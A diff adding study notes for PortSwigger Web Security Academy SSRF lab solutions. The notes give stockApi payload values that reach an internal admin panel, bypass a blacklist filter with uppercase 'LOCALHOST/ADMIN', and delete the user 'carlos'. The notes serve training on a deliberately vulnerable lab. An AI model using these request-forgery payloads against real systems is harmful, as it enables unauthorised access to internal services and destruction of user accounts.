@@ -14,4 +14,9 @@ solution:
     step-5: click 'action' then send the attack to repeater
     step-6: append url to delete 'carlos' to the stockApi parameter (i.e. - stockApi=http://192.168.0.218:8080/admin/delete?username=carlos)
 
+[lab: SSRF with blacklist-based input filter]
+url: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
+solution:
+    step-1: using burpsuite, send proxy intercept (after clicking 'check stock') to intruder, and change value of 'stockApi' parameter to stockApi=http://LOCALHOST/ADMIN
+    step-2: grab url of link to delete user 'carlos' and append it to the value parameter used in step 1, (stockApi=http://LOCALHOST/ADMIN/DELETE?username=carlos)
 
